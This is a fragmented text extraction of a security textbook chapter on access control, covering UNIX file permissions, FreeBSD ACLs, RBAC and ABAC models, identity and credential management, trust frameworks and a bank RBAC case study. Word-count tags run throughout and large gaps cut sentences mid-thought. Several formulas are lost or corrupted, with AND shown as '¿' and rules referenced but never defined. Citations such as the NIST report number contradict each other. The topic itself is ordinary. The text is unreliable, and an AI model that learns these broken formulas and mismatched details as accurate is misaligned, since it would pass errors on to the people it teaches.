[Word Count: 19]

Directories are structured in a hierarchical tree. Each directory can con-
tain files and/or other directories. A directory that is inside another directory is 
­referred to as a subdirectory. A directory is simply a file that contains a list of file 
names plus pointers to associated inodes. Thus, associated with each directory is 
its own inode.
[Word Count: 56]

4.4 / Example: UNIX File Access Control   125
[Word Count: 8]

The final permission bit is the “sticky” bit. When set on a file, this originally 
­indicated that the system should retain the file contents in memory following execu-
tion. This is no longer used. When applied to a directory, though, it specifies that 
only the owner of any file in the directory can rename, move, or delete that file. This 
is useful for managing files in shared temporary directories.
[Word Count: 69]

One particular user ID is designated as “superuser.” The superuser is 
­exempt from the usual file access control constraints and has systemwide access. 
Any ­program that is owned by, and SetUID to, the “superuser” potentially grants
[Word Count: 36]

1Note that the permissions that apply to a directory are distinct from those that apply to any file or 
­directory it contains. The fact that a user has the right to write to the directory does not give the user the 
right to write to a file in that directory. That is governed by the permissions of the specific file. The user 
would, however, have the right to rename the file.
[Word Count: 71]

­unrestricted access to the system to any user executing that program. Hence great 
care is needed when writing such programs.
[Word Count: 20]

(a) Traditional UNIX approach (minimal access control list)
[Word Count: 8]

2Most UNIX systems impose a limit on the maximum number of groups any user may belong to, as well 
as to the total number of groups possible on the system.
[Word Count: 30]

A final point to note is that the traditional UNIX file access control scheme 
implements a simple protection domain structure. A domain is associated with the 
user, and switching the domain corresponds to changing the user ID temporarily.
[Word Count: 38]

Many modern UNIX and UNIX-based operating systems support access control 
lists, including FreeBSD, OpenBSD, Linux, and Solaris. In this section, we describe 
FreeBSD, but other implementations have essentially the same features and inter-
face. The feature is referred to as extended access control list, while the traditional 
UNIX approach is referred to as minimal access control list.
[Word Count: 57]

FreeBSD allows the administrator to assign a list of UNIX user IDs and groups 
to a file by using the setfacl command. Any number of users and groups can be 
­associated with a file, each with three protection bits (read, write, execute), ­offering a 
­flexible mechanism for assigning access rights. A file need not have an ACL but may be 
­protected solely by the traditional UNIX file access mechanism. Free­BSD files ­include 
an additional protection bit that indicates whether the file has an extended ACL.
[Word Count: 85]

FreeBSD and most UNIX implementations that support extended ACLs use 
the following strategy (e.g., Figure 4.5b):
[Word Count: 16]

1.	 The owner class and other class entries in the 9-bit permission field have the
[Word Count: 15]

same meaning as in the minimal ACL case.
	
2.	 The group class entry specifies the permissions for the owner group for this file.
[Word Count: 23]

These permissions represent the maximum permissions that can be assigned to 
named users or named groups, other than the owning user. In this latter role, the 
group class entry functions as a mask.
	
3.	 Additional named users and named groups may be associated with the file,
[Word Count: 46]

each with a 3-bit permission field. The permissions listed for a named user or 
named group are compared to the mask field. Any permission for the named 
user or named group that is not present in the mask field is disallowed.
[Word Count: 41]

Traditional DAC systems define the access rights of individual users and groups 
of users. In contrast, RBAC is based on the roles that users assume in a system 
rather than the user’s identity. Typically, RBAC models define a role as a job func-
tion within an organization. RBAC systems assign access rights to roles instead of
[Word Count: 56]

­individual users. In turn, users are assigned to different roles, either statically or 
dynamically, according to their responsibilities.
[Word Count: 18]

RBAC now enjoys widespread commercial use and remains an area of ­active 
research. The National Institute of Standards and Technology (NIST) has issued a stan-
dard, Security Requirements for Cryptographic Modules (FIPS PUB 140-3, September 
2009), that requires support for access control and administration through roles.
[Word Count: 46]

The relationship of users to roles is many to many, as is the relationship of 
roles to resources, or system objects (Figure 4.6). The set of users changes, in some 
environments frequently, and the assignment of a user to one or more roles may 
also be dynamic. The set of roles in the system in most environments is relatively
[Word Count: 59]

Figure 4.6    Users, Roles, and Resources
[Word Count: 6]

static, with only occasional additions or deletions. Each role will have specific access 
rights to one or more resources. The set of resources and the specific access rights 
­associated with a particular role are also likely to change infrequently.
[Word Count: 39]

We can use the access matrix representation to depict the key elements of an 
RBAC system in simple terms, as shown in Figure 4.7. The upper matrix relates 
­individual users to roles. Typically there are many more users than roles. Each ­matrix
[Word Count: 42]

Figure 4.7    Access Control Matrix Representation of RBAC
[Word Count: 8]

RBAC lends itself to an effective implementation of the principle of least 
­privilege, referred to in Chapter 1. Each role should contain the minimum set of 
access rights needed for that role. A user is assigned to a role that enables him or her 
to perform only what is required for that role. Multiple users assigned to the same 
role, enjoy the same minimal set of access rights.
[Word Count: 68]

A variety of functions and services can be included under the general RBAC 
­approach. To clarify the various aspects of RBAC, it is useful to define a set of 
­abstract models of RBAC functionality.
[Word Count: 34]

[SAND96] defines a family of reference models that has served as the basis 
for ongoing standardization efforts. This family consists of four models that are 
­related to each other as shown in Figure 4.8a. and Table 4.3. RBAC0 contains the 
minimum functionality for an RBAC system. RBAC1 includes the RBAC0 func-
tionality and adds role hierarchies, which enable one role to inherit permissions 
from another role. RBAC2 includes RBAC0 and adds constraints, which restrict 
the ways in which the components of a RBAC system may be configured. RBAC3 
contains the functionality of RBAC0, RBAC1, and RBAC2.
[Word Count: 96]

Base Model—RBAC0  Figure 4.8b, without the role hierarchy and constraints, 
contains the four types of entities in an RBAC0 system:
[Word Count: 20]

• User:  An individual that has access to this computer system. Each individual
[Word Count: 13]

has an associated user ID.
	
• Role:  A named job function within the organization that controls this computer
[Word Count: 18]

system. Typically, associated with each role is a description of the authority and 
responsibility conferred on this role, and on any user who assumes this role.
	
• Permission:  An approval of a particular mode of access to one or more ­objects.
[Word Count: 41]

Equivalent terms are access right, privilege, and authorization.
	
• Session:  A mapping between a user and an activated subset of the set of roles
[Word Count: 24]

The many-to-many relationships between users and roles and between roles 
and permissions provide a flexibility and granularity of assignment not found in 
­conventional DAC schemes. Without this flexibility and granularity, there is a greater 
risk that a user may be granted more access to resources than is needed ­because of 
the limited control over the types of access that can be allowed. The NIST RBAC 
document gives the following examples: Users may need to list directories and ­modify
[Word Count: 78]

Figure 4.8    A Family of Role-Based Access Control Models    RBAC0 is 
the minimum requirement for an RBAC system. RBAC1 adds role hierar-
chies and RBAC2 adds constraints. RBAC3 includes RBAC1 and RBAC2
[Word Count: 32]

existing files without creating new files, or they may need to ­append records to a file 
without modifying existing records.
[Word Count: 20]

Role Hierarchies—RBAC1  Role hierarchies provide a means of reflecting the 
hierarchical structure of roles in an organization. Typically, job functions with 
greater responsibility have greater authority to access resources. A subordinate job 
function may have a subset of the access rights of the superior job function. Role 
­hierarchies make use of the concept of inheritance to enable one role to implicitly 
include access rights associated with a subordinate role.
[Word Count: 69]

Constraints—RBAC2  Constraints provide a means of adapting RBAC to the 
specifics of administrative and security policies in an organization. A constraint is 
a defined relationship among roles or a condition related to roles. [SAND96] lists 
the following types of constraints: mutually exclusive roles, cardinality, and prere­
quisite roles.
[Word Count: 48]

4.6 / Attribute-Based Access Control   133
[Word Count: 6]

Mutually exclusive roles are roles such that a user can be assigned to only 
one role in the set. This limitation could be a static one, or it could be dynamic, in 
the sense that a user could be assigned only one of the roles in the set for a session. 
The mutually exclusive constraint supports a separation of duties and capabilities 
within an organization. This separation can be reinforced or enhanced by use of 
­mutually exclusive permission assignments. With this additional constraint, a mutu-
ally exclusive set of roles has the following properties:
[Word Count: 94]

1.	 A user can only be assigned to one role in the set (either during a session or
[Word Count: 18]

statically).
	
2.	 Any permission (access right) can be granted to only one role in the set.
[Word Count: 16]

Thus the set of mutually exclusive roles have non-overlapping permissions. If two 
users are assigned to different roles in the set, then the users have non-overlapping 
­permissions while assuming those roles. The purpose of mutually exclusive roles is to 
increase the difficulty of collusion among individuals of different skills or divergent job 
functions to thwart security policies.
[Word Count: 57]

­impact of evaluating predicates on both resource and user properties for each 
access. However, for applications such as cooperating Web services and cloud com-
puting, this increased performance cost is less noticeable because there is already a 
relatively high performance cost for each access. Thus, Web services have been pio-
neering technologies for implementing ABAC models, especially through the intro-
duction of the eXtensible Access Control Markup Language (XAMCL) [BEUC13], 
and there is considerable interest in applying the ABAC model to cloud services 
[IQBA12, YANG12].
[Word Count: 85]

There are three key elements to an ABAC model: attributes, which are defined 
for entities in a configuration; a policy model, which defines the ABAC policies; and 
the architecture model, which applies to policies that enforce access control. We 
examine these elements in turn.
[Word Count: 44]

Attributes are characteristics that define specific aspects of the subject, object, envi-
ronment conditions, and/or requested operations that are predefined and preassigned 
by an authority. Attributes contain information that indicates the class of informa-
tion given by the attribute, a name, and a value (e.g., Class=HospitalRecordsAccess, 
Name=PatientInformationAccess, Value=MFBusinessHoursOnly).
[Word Count: 48]

The following are the three types of attributes in the ABAC model:
[Word Count: 12]

• Subject attributes:  A subject is an active entity (e.g., a user, an application, a
[Word Count: 15]

process, or a device) that causes information to flow among objects or changes 
the system state. Each subject has associated attributes that define the identity 
and characteristics of the subject. Such attributes may include the subject’s 
identifier, name, organization, job title, and so on. A subject’s role can also be 
viewed as an attribute.
 
• Object attributes:  An object, also referred to as a resource, is a passive (in the
[Word Count: 70]

context of the given request) information system-related entity (e.g., devices, 
files, records, tables, processes, programs, networks, domains) containing or 
receiving information. As with subjects, objects have attributes that can be 
leveraged to make access control decisions. A Microsoft Word document, for 
example, may have attributes such as title, subject, date, and author. Object 
attributes can often be extracted from the metadata of the object. In particu-
lar, a variety of Web service metadata attributes may be relevant for access 
control purposes, such as ownership, service taxonomy, or even Quality of 
­Service (QoS) attributes.
[Word Count: 93]

• Environment attributes:  These attributes have so far been largely ignored in
[Word Count: 12]

most access control policies. They describe the operational, technical, and even 
situational environment or context in which the information access occurs. For 
example, attributes, such as current date and time, the current virus/hacker 
activities, and the network’s security level (e.g., Internet vs. intranet), are not 
associated with a particular subject nor a resource, but may nonetheless be 
relevant in applying an access control policy.
[Word Count: 64]

ABAC is a logical access control model that is distinguishable because it con-
trols access to objects by evaluating rules against the attributes of entities (subject 
and object), operations, and the environment relevant to a request. ABAC relies
[Word Count: 38]

4.6 / Attribute-Based Access Control   135
[Word Count: 6]

Figure 4.10 illustrates in a logical architecture the essential components of an ABAC 
system. An access by a subject to an object proceeds according to the following steps:
[Word Count: 28]

1.	 A subject requests access to an object. This request is routed to an access con-
[Word Count: 16]

trol mechanism.
	
2.	 The access control mechanism is governed by a set of rules (2a) that are defined
[Word Count: 18]

by a preconfigured access control policy. Based on these rules, the access control 
mechanism assesses the attributes of the subject (2b), object (2c), and current 
environmental conditions (2d) to determine authorization.
[Word Count: 31]

3.	 The access control mechanism grants the subject access to the object if access
[Word Count: 14]

is authorized and denies access if it is not authorized.
[Word Count: 10]

A policy is a set of rules and relationships that govern allowable behavior within an 
organization, based on the privileges of subjects and how resources or objects are to 
be protected under which environment conditions. In turn, privileges represent the 
authorized behavior of a subject; they are defined by an authority and embodied in 
a policy. Other terms that are commonly used instead of privileges are rights, autho-
rizations, and entitlements. Policy is typically written from the perspective of the 
object that needs protecting and the privileges available to subjects.
[Word Count: 90]

4.6 / Attribute-Based Access Control   137
[Word Count: 6]

Figure 4.11  ACL and ABAC Trust Relationships
[Word Count: 7]

We now define an ABAC policy model, based on the model presented in 
[YUAN05]. The following conventions are used:
[Word Count: 19]

1.	 S, O, and E are subjects, objects, and environments, respectively;
	
2.	 SAk (1 … k … K), OAm (1 … m … M), and EAn (1 … n … N) are the pre-de-
[Word Count: 34]

fined ­attributes for subjects, objects, and environments, respectively;
[Word Count: 8]

3.	 ATTR(s), ATTR(o), and ATTR(e) are attribute assignment relations for sub-
[Word Count: 11]

ject s, object o, and environment e, respectively:
[Word Count: 8]

ATTR(s) ⊆SA1 × SA2 × ... × SAK
ATTR(r) ⊆OA1 × OA2 × ... × OAM
ATTR(o) ⊆EA1 × EA2 × ... × EAN
[Word Count: 24]

We also use the function notation for the value assignment of individual attri-
butes. For example:
[Word Count: 16]

Role(s) = “Service Consumer”
ServiceOwner(o) = “XYZ, Inc.”
CurrentDate(e) = “01-23-2005”
[Word Count: 11]

4.	 In the most general form, a Policy Rule, which decides on whether a subject s
[Word Count: 16]

can access an object o in a particular environment e, is a Boolean function of the 
attributes of s, o, and e:
[Word Count: 22]

Rule: can_access (s, o, e) ← ƒ(ATTR(s), ATTR(o), ATTR(e))
[Word Count: 9]

Given all the attribute assignments of s, o, and e, if the function’s evaluation is 
true, then the access to the resource is granted; otherwise the access is denied.
	
5.	 A policy rule base or policy store may consist of a number of policy rules,
[Word Count: 45]

covering many subjects and objects within a security domain. The access con-
trol decision process in essence amounts to the evaluation of applicable policy 
rules in the policy store.
[Word Count: 29]

Now consider the example of an online entertainment store that streams mov-
ies to users for a flat monthly fee. We will use this example to contrast RBAC and 
ABAC approaches. The store must enforce the following access control policy 
based on the user’s age and the movie’s content rating:
[Word Count: 50]

Movie Rating
Users Allowed Access
R
Age 17 and older
PG-13
Age 13 and older
G
Everyone
[Word Count: 17]

In an RBAC model, every user would be assigned one of three roles: Adult, 
Juvenile, or Child, possibly during registration. There would be three permissions 
created: Can view R-rated movies, Can view PG-13-rated movies, and Can view 
G-rated movies. The Adult role gets assigned with all three permissions; the Juve-
nile role gets Can view PG-13-rated movies and Can view G-rated movies permis-
sions, and the Child role gets the Can view G-rated movies permission only. Both 
the user-to-role assignment and the permission-to-role assignment are manual 
administrative tasks.
[Word Count: 88]

The ABAC approach to this application does not need to explicitly define 
roles. Instead, whether a user u can access or view a movie m (in a security environ-
[Word Count: 29]

4.7 / Identity, Credential, and Access Management   139
[Word Count: 8]

ment e which is ignored here) would be resolved by evaluating a policy rule such as 
the following:
[Word Count: 18]

(Age(u) ≥ 17 ¿ Rating(m) ∈{R, PG-13, G})
[Word Count: 8]

(Age(u) ≥ 13 ¿ Age(u) < 17 ¿ Rating(m) ∈{PG-13, G})
[Word Count: 11]

where Age and Rating are the subject attribute and the object attribute, ­respectively. 
The advantage of the ABAC model shown here is that it eliminates the definition 
and management of static roles, hence eliminating the need for the administrative 
tasks for user-to-role assignment and permission-to-role assignment.
[Word Count: 46]

In general, if there are K subject attributes and M object attributes, and if for 
each attribute, Range() denotes the range of possible values it can take, then the 
respective number of roles and permissions required for an RBAC model are:
[Word Count: 41]

Thus we can see that as the number of attributes increases to accommodate 
finer-grained policies, the number of roles and permissions grows exponentially. In 
contrast, the ABAC model deals with additional attributes in an efficient way. For 
this example, the policy R1 defined previously still applies. We need two new rules:
[Word Count: 51]

(MembershipType(u) = Premium)  
(MembershipType(u) = Regular ¿ MovieType(m) = OldRelease)
R3:can_access(u, m, e) ← R3 ¿ R4
[Word Count: 17]

With the ABAC model, it is also easy to add environmental attributes. Suppose 
we wish to add a new policy rule that is expressed in words as follows: Regular users are 
allowed to view new releases in promotional periods. This would be difficult to express 
in an RBAC model. In an ABAC model, we only need add a conjunctive (AND) rule 
that checks to see the environmental attribute today’s date falls in a promotional period.
[Word Count: 75]

4.7	 Identity, Credential, and Access Management
[Word Count: 6]

We now examine some concepts that are relevant to an access control approach 
centered on attributes. This section provides an overview of the concept of identity, 
credential, and access management (ICAM), and then Section 4.8 discusses the use 
of a trust framework for exchanging attributes.
[Word Count: 45]

ICAM is a comprehensive approach to managing and implementing digital 
identities (and associated attributes), credentials, and access control. ICAM has 
been developed by the U.S. government, but is applicable not only to government 
agencies, but also may be deployed by enterprises looking for a unified approach to 
access control. ICAM is designed to
[Word Count: 53]

• Create trusted digital identity representations of individuals and what the
[Word Count: 11]

ICAM documents refer to as nonperson entities (NPEs). The latter include 
processes, applications, and automated devices seeking access to a resource.
 
• Bind those identities to credentials that may serve as a proxy for the individual
[Word Count: 36]

or NPE in access transactions. A credential is an object or data structure that 
authoritatively binds an identity (and optionally, additional attributes) to a 
token possessed and controlled by a subscriber.
 
• Use the credentials to provide authorized access to an agency’s resources.
[Word Count: 43]

Figure 4.12 provides an overview of the logical components of an ICAM archi-
tecture. We examine each of the main components in the following subsections.
[Word Count: 25]

Figure 4.12  Identity, Credential, and Access Management (ICAM)
[Word Count: 8]

4.7 / Identity, Credential, and Access Management   141
[Word Count: 8]

A final element of identity management is lifecycle management, which 
includes the following:
[Word Count: 13]

• Mechanisms, policies, and procedures for protecting personal identity
[Word Count: 9]

information
 
• Controlling access to identity data
 
• Techniques for sharing authoritative identity data with applications that need it
 
• Revocation of an enterprise identity
[Word Count: 25]

As mentioned, a credential is an object or data structure that authoritatively binds 
an identity (and optionally, additional attributes) to a token possessed and con-
trolled by a subscriber. Examples of credentials are smart cards, private/public cryp-
tographic keys, and digital certificates. Credential management is the management
[Word Count: 47]

of the life cycle of the credential. Credential management encompasses the follow-
ing five logical components:
[Word Count: 16]

1.	 An authorized individual sponsors an individual or entity for a credential to
[Word Count: 13]

establish the need for the credential. For example, a department supervisor 
sponsors a department employee.
	
2.	 The sponsored individual enrolls for the credential, a process which typically con-
[Word Count: 28]

sists of identity proofing and the capture of biographic and biometric data. This 
step may also involve incorporating authoritative attribute data, maintained by 
the identity management component.
	
3.	 A credential is produced. Depending on the credential type, production may
[Word Count: 39]

involve encryption, the use of a digital signature, the production of a smart-
card, or other functions.
	
4.	 The credential is issued to the individual or NPE.
	
5.	 Finally, a credential must be maintained over its life cycle, which might include
[Word Count: 41]

revocation, reissuance/replacement, reenrollment, expiration, personal identi-
fication number (PIN) reset, suspension, or reinstatement.
[Word Count: 13]

The access management component deals with the management and control of the 
ways entities are granted access to resources. It covers both logical and physical 
access, and may be internal to a system or an external element. The purpose of 
access management is to ensure that the proper identity verification is made when 
an individual attempts to access security sensitive buildings, computer systems, 
or data. The access control function makes use of credentials presented by those 
requesting access and the digital identity of the requestor. Three support elements 
are needed for an enterprise-wide access control facility:
[Word Count: 96]

• Resource management:  This element is concerned with defining rules for
[Word Count: 11]

a resource that requires access control. The rules would include creden-
tial  requirements and what user attributes, resource attributes, and envi-
ronmental conditions are required for access of a given resource for a given 
function.
 
• Privilege management:  This element is concerned with establishing and main-
[Word Count: 46]

taining the entitlement or privilege attributes that comprise an individual’s 
access profile. These attributes represent features of an individual that can be 
used as the basis for determining access decisions to both physical and logical 
resources. Privileges are considered attributes that can be linked to a digital 
identity.
 
• Policy management:  This element governs what is allowable and unallow-
[Word Count: 59]

able in an access transaction. That is, given the identity and attributes of 
the requestor, the attributes of the resource or object, and environmental 
conditions, a policy specifies what actions this user can perform on this 
object.
[Word Count: 37]

Identity federation addresses two questions:
[Word Count: 5]

1.	 How do you trust identities of individuals from external organizations who
[Word Count: 12]

need access to your systems?
	
2.	 How do you vouch for identities of individuals in your organization when they
[Word Count: 19]

need to collaborate with external organizations?
[Word Count: 6]

Identity federation is a term used to describe the technology, standards, pol-
icies, and processes that allow an organization to trust digital identities, identity 
attributes, and credentials created and issued by another organization. We discuss 
identity federation in the following section.
[Word Count: 41]

The same concern for attributes is increasingly important for all types of access 
control situations, not just the e-business context. For example, an enterprise may 
need to provide access to resources for customers, users, suppliers, and partners. 
Depending on context, access will be determined not just by identity but by the 
attributes of the requestor and the resource.
[Word Count: 58]

Online or network transactions involving parties from different organizations, or 
between an organization and an individual user such as an online customer, gener-
ally require the sharing of identity information. This information may include a host 
of associated attributes in addition to a simple name or numerical identifier. Both 
the party disclosing the information and the party receiving the information need 
to have a level of trust about security and privacy issues related to that information.
[Word Count: 76]

Figure 4.13a shows the traditional technique for the exchange of identity infor-
mation. This involves users developing arrangements with an identity service pro-
vider to procure digital identity and credentials, and arrangements with parties that 
provide end-user services and applications and that are willing to rely on the identity 
and credential information generated by the identity service provider.
[Word Count: 58]

(a) Traditional triangle of parties involved in an exchange of identity information
[Word Count: 12]

(b) Identity attribute exchange elements
[Word Count: 5]

Figure 4.13  Identity Information Exchange Approaches
[Word Count: 6]

described by the other parties are actually those implemented by the parties, and 
how reliable those parties are.
[Word Count: 18]

Without some universal standard and framework, the arrangement of Figure 4.13a 
must be replicated in multiple contexts. A far preferable approach is to develop an 
open, standardized approach to trustworthy identity and attribute exchange. In the 
remainder of this section, we examine such an approach that is gaining increasing 
acceptance.
[Word Count: 50]

Unfortunately, this topic is burdened with numerous acronyms, so it is best to 
begin with a definition of the most important of these:
[Word Count: 23]

• OpenID:  This is an open standard that allows users to be authenticated by cer-
[Word Count: 15]

tain cooperating sites (known as Relying Parties) using a third party service, 
eliminating the need for Webmasters to provide their own ad hoc systems and 
allowing users to consolidate their digital identities. Users may create accounts 
with their preferred OpenID identity providers, and then use those accounts as 
the basis for signing on to any website which accepts OpenID authentication.
 
• OIDF:  The OpenID Foundation is an international nonprofit organization of
[Word Count: 71]

individuals and companies committed to enabling, promoting, and protecting 
OpenID technologies. OIDF assists the community by providing needed infra-
structure and help in promoting and supporting expanded adoption of OpenID.
 
• ICF:  The Information Card Foundation is a nonprofit community of compa-
[Word Count: 42]

nies and individuals working together to evolve the Information Card eco-
system. Information Cards are personal digital identities that people can use 
online, and the key component of identity metasystems. Visually, each Infor-
mation Card has a card-shaped picture and a card name associated with it that 
enable people to organize their digital identities and to easily select one they 
want to use for any given interaction.
 
• OITF:  The Open Identity Trust Framework is a standardized, open specifi-
[Word Count: 79]

cation of a trust framework for identity and attribute exchange, developed 
jointly by OIDF and ICF.
 
• OIX:  The Open Identity Exchange Corporation is an independent, neutral,
[Word Count: 27]

international provider of certification trust frameworks conforming to the 
Open Identity Trust Frameworks model.
 
• AXN:  An Attribute Exchange Network (AXN) is an online Internet-scale
[Word Count: 25]

gateway for identity service providers and relying parties to efficiently access 
user asserted, permissioned, and verified online identity attributes in high vol-
umes at affordable costs.
[Word Count: 26]

System managers need to be able to trust that the attributes associated with 
a subject or an object are authoritative and are exchanged securely. One approach 
to providing that trust within an organization is the ICAM model, specifically the 
ICAM components (Figure 4.12). Combined with an identity federation functional-
ity that is shared with other organizations, attributes can be exchanged in a trust­
worthy fashion, supporting secure access control.
[Word Count: 69]

Figure 4.13b shows the elements involved in the OITF. Within any given orga-
nization or agency, the following roles are part of the overall framework:
[Word Count: 25]

• Relying parties (RPs):  Also called service providers, these are entities deliver-
[Word Count: 12]

ing services to specific users. RPs must have confidence in the identities and/or  
attributes of their intended users, and must rely upon the various credentials 
presented to evince those attributes and identities.
 
• Subjects:  These are users of an RP’s services, including customers, employees,
[Word Count: 44]

trading partners, and subscribers.
 
• Attribute providers (APs):  APs are entities acknowledged by the community
[Word Count: 15]

of interest as being able to verify given attributes as presented by subjects 
and which are equipped through the AXN to create conformant attribute cre-
dentials according to the rules and agreements of the AXN. Some APs will 
be sources of authority for certain information; more commonly APs will be 
brokers of derived attributes.
 
• Identity providers (IDPs):  These are entities able to authenticate user creden-
[Word Count: 66]

tials and to vouch for the names (or pseudonyms or handles) of subjects, and 
which are equipped through the AXN or some other compatible Identity and 
Access Management (IDAM) system to create digital identities that may be 
used to index user attributes.
[Word Count: 42]

There are also the following important support elements as part on an AXN:
[Word Count: 13]

• Assessors:  Assessors evaluate identity service providers and RPs and certify
[Word Count: 11]

that they are capable of following the OITF provider’s blueprint.
 
• Auditors:  These entities may be called on to check that parties’ practices have
[Word Count: 24]

been in line with what was agreed for the OITF.
 
• Dispute resolvers:  These entities provide arbitration and dispute resolution
[Word Count: 20]

under OIX guidelines.
 
• Trust framework providers:  A trust framework provider is an organization
[Word Count: 14]

that translates the requirements of policymakers into an own blueprint for a 
trust framework that it then proceeds to build, doing so in a way that is con-
sistent with the minimum requirements set out in the OITF specification. In
[Word Count: 40]

4.9 / Case Study: RBAC System for a Bank   147
[Word Count: 10]

almost all cases, there will be a reasonably obvious candidate organization to 
take on this role, for each industry sector or large organization that decides it 
is appropriate to interoperate with an AXN.
[Word Count: 33]

banking/Group Manager and financial analyst/Clerk because they work in different 
functional areas. We can therefore define a role hierarchy in which one role is supe-
rior to ­another if its position is superior and their functions are identical. The role 
hierarchy makes it possible to economize on ­access rights definitions, as suggested 
in Table 4.4c.
[Word Count: 55]

Table 4.4    Functions and Roles for Banking Example
[Word Count: 8]

G 
financial analyst 
Assistant 
. . .
. . . 
. . .
[Word Count: 13]

(c) Permission Assignment with Inheritance
[Word Count: 5]

interest  
instruments 
1, 4, 8, 12, 14, 16
[Word Count: 8]

4.9 / Case Study: RBAC System for a Bank   149
[Word Count: 10]

A user is statically assigned a role. In principle (in this example), each user 
may be statically ­assigned up to four roles and select a given role for use in invoking 
a particular ­application. This corresponds to the NIST concept of session. In prac-
tice, most users are statically assigned a single role based on the user’s position and 
job function.
[Word Count: 61]

A role may be used to access several applications. Thus, the set of ­access rights 
associated with a role may include access rights that are not associated with one 
of the applications the user invokes. This is illustrated in Table 4.4b. Role A has 
­numerous access rights, but only a subset of those rights are applicable to each of the 
three applications that role A may invoke.
[Word Count: 67]

Figure 4.14    Example of Access Control Administration
[Word Count: 7]

Some figures about this system are of interest. Within the bank, there are 65 
­official positions, ranging from a Clerk in a branch, through the Branch Manager, 
to a Member of the Board. These positions are combined with 368 different job 
­functions provided by the human ­resources database. Potentially, there are 23,920 
different roles, but the number of roles in current use is about 1,300. This is in line 
with the experience other RBAC implementations. On average, 42,000 security 
­profiles are distributed to applications each day by the Authorization Administra-
tion module.
[Word Count: 92]

[DOWN85] provides a good review of the basic elements of DAC. [KAIN87] is a 
clear ­discussion of capability-based access control.
[Word Count: 20]

[SAND96] is a comprehensive overview of RBAC. [FERR92] also provides 
some ­useful ­insights. [BARK97] looks at the similarities in functionality between 
RBAC and DAC based on access control lists. [SAUN01] is a more general com-
parison of RBAC and DAC. [FRAN12] discusses the strengths and weakness of 
RBAC and its applicability in various contexts. [FERR01] and [SAND00] present 
the NIST RBAC ­standard in exhaustive detail. [COYN08] describes the INCITS 
RBAC implementation and interoperability standard, based in the NIST standard.
[Word Count: 79]

NIST SP 800-16 [HU13] provides an excellent overview of ABAC models 
and their application. [CIOC11] is a clear and thorough introduction to ICAM. 
[RUND10] is a useful overview of OITF. [OIX13] is a much more detailed treat-
ment of trust frameworks and attribute exchange networks.
[Word Count: 45]

BARK97    Barkley, J. “Comparing Simple Role-Based Access Control Models and Access
[Word Count: 11]

Control Lists.” Proceedings of the Second ACM Workshop on Role-Based 
Access Control, 1997.
CIOC11      CIO Council. Federal Identity, Credential, and Access Management (FICAM)
[Word Count: 23]

Roadmap and Implementation Guidance. cio.gov. December 2011.
COYN08    Coyne, E., and Weil, T. “An RBAC Implementation and Interoperability Stan-
[Word Count: 19]

dard.” IEEE Security & Privacy, January/February 2008.
DOWN85  Down, D., et al. “Issues in Discretionary Access Control.” Proceedings of the
[Word Count: 20]

1985 Symposium on Security and Privacy, 1985.
FERR92    Ferraiolo, D., and Kuhn, R. “Role-Based Access Control.” Proceedings of
[Word Count: 18]

the 15th National Computer Security Conference, 1992.
FERR01    Ferraiolo, D., et al. “Proposed NIST Standard for Role-Based Access
[Word Count: 18]

­Control.” ACM Transactions on Information and System Security, August 
2001.
FRAN12    Franqueira, V., and Wieringa, R. “Role-Based Access Control in Retro-
[Word Count: 21]

spect.” Computer, June 2012.
HU13         Hu, V. et al. Guide to Attribute Based Access Control (ABAC) Definition and
[Word Count: 18]

Considerations. NIST SP 800-62, September 2013.
KAIN87    Kain, R., and Landwehr. “On Access Checking in Capability-Based System.”
[Word Count: 17]

IEEE Transactions on Software Engineering, February 1987.
[Word Count: 7]

4.11 / Key Terms, Review Questions, and Problems   151
[Word Count: 9]

4.11	Key Terms, Review Questions, and Problems
[Word Count: 7]

OIX13        Open Identity Exchange. Attribute Exchange Trust Framework Specification.
[Word Count: 9]

July 2013. http://openidentityexchange.org
RUND10   Rundle, M., ed. The Open Identity Trust Framework (OITF) Model. Microsoft
[Word Count: 15]

White Paper, March 2010. http://www.microsoft.com/mscorp/twc/endtoend 
trust/default.aspx
SAND96    Sandhu, R., et al. “Role-Based Access Control Models.” Computer, February
[Word Count: 17]

1996.
SAND00    Sandhu, R.; Ferraiolo, D.; and Kuhn, R. “The NIST Model for Role-Based
[Word Count: 14]

Access Control: Towards a Unified Standard.” Proceedings of the Fifth ACM 
Workshop on Role-Based Access Control, 2000.
SAUN01    Saunders, G.; Hitchens, M.; and Varadharajan, V. “Role-Based Access ­Control
[Word Count: 28]

and the Access Control Matrix.” Operating Systems Review, October 2001.
[Word Count: 10]

access control
access control list
access management
access matrix
access right
attribute
attribute-based access  
  control (ABAC)
Attribute Exchange  
  Network (AXN)
attribute provider
auditor
authorizations
assessor
capability ticket
cardinality
closed access control policy
credential
credential management
discretionary access control  
  (DAC)
dispute resolver
dynamic separation of duty  
  (DSD)
entitlements
[Word Count: 47]

environment attribute
general role hierarchy
group
identity
identity, credential, and  
  access management  
  (ICAM)
identity federation
identity management
identity provider
Information Card  
  Foundation (ICF)
kernel mode
least privilege
limited role hierarchy
mandatory access control  
  (MAC)
mutually exclusive roles
object
object attribute
open access control policy
Open Identity Exchange  
  Corporation (OIX)
Open Identity Trust  
  Framework (OITF)
[Word Count: 54]

OpenID
OpenID Foundation (OIDF)
owner
permission
policy
prerequisite role
privilege
protection domain
relying part
resource
rights
role-based access control  
  (RBAC)
role constraints
role hierarchies
separation of duty
session
static separation of duty  
  (SSD)
subject
subject attribute
trust framework
trust framework provider
user mode
[Word Count: 43]

and the access matrix representation? Explain.
	
4.2	
a.	 Suggest a way of implementing protection domains using access control lists.
	
b.	 Suggest a way of implementing protection domains using capability tickets.
	
Hint: In both cases a level of indirection is required.
	
4.3	
The VAX/VMS operating system makes use of four processor access modes to 
­facilitate the protection and sharing of system resources among processes. The access 
mode determines:
	
•	 Instruction execution privileges:  What instructions the processor may execute
	
•	 Memory access privileges:  Which locations in virtual memory the current instruc-
[Word Count: 89]

tion may access
	
	
The four modes are as follows:
	
•	 Kernel:  Executes the kernel of the VMS operating system, which includes mem-
[Word Count: 22]

ory management, interrupt handling, and I/O operations
	
•	 Executive:  Executes many of the operating system service calls, including file and
[Word Count: 20]

record (disk and tape) management routines
	
•	 Supervisor:  Executes other operating system services, such as responses to user
[Word Count: 18]

commands
	
•	 User:  Executes user programs, plus utilities such as compilers, editors, linkers,
[Word Count: 13]

and ­debuggers
	
	
A process executing in a less-privileged mode often needs to call a procedure that 
­executes in a more-privileged mode; for example, a user program requires an operat-
ing system service. This call is achieved by using a change-mode (CHM) instruction, 
which causes an interrupt that transfers control to a routine at the new access mode. A 
